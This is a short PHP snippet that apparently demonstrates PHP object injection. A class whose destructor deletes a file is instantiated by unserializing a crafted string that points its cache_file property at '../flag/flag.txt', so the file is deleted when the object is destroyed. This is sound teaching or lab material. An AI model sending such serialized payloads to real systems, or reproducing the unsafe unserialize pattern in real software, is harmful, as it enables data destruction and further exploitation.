<?php
class Example1
{
   public $cache_file;
 
   function __construct()
   {
      // some PHP code...
   }
 
   function __destruct()
   {
      $file = $this->cache_file;
      if (file_exists($file)) @unlink($file);
   }
}
 
// some PHP code...
$user_data = unserialize('O:8:"Example1":1:{s:10:"cache_file";s:16:"../flag/flag.txt";}');
echo $user_data;
 
// some PHP code...
?>